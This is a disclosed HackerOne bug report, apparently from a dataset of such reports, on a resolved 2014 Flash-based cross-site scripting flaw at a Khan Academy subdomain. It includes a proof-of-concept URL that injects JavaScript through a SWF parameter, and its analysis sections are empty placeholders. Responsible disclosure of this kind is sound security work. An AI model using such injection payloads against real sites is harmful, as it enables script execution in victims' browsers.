---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '6575'
original_report_id: '6575'
title: XSS at  http://smarthistory.khanacademy.org
weakness: Cross-site Scripting (XSS) - Generic
team_handle: khanacademy
created_at: '2014-04-08T18:46:23.314Z'
disclosed_at: '2014-04-09T04:33:45.926Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS at  http://smarthistory.khanacademy.org

## Metadata

- HackerOne Report ID: 6575
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: khanacademy
- Disclosed At: 2014-04-09T04:33:45.926Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

There is a SWF-based XSS : http://smarthistory.khanacademy.org/assets/flash/cozimo.swf?iceID=\%22%29%29}catch%28e%29{alert%28%27XSS%27%29;}//

Opening the link would trigger JavaScript execution! Works in possibly any browser with **Adobe Flash, i.e - Chrome, Firefox**


Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
